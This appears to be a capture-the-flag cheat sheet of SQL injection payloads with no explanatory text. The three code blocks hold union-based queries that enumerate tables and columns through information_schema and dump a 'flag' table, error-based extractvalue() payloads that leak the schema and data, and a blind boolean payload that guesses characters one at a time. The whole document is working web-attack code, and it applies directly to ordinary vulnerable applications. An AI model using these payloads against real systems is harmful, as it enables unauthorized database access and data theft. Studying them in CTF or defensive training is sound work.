```sql
union select database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+
union select database(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'--+
union select database(),group_concat(flag) from flag--+
```

```sql
and extractvalue(1,concat(0x7e,database()))--+
and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+
and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag')))--+
and extractvalue(1,concat(0x7e,substr((select group_concat(flag) from flag),1,30)))--+
```

```
1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=100 -- 
```

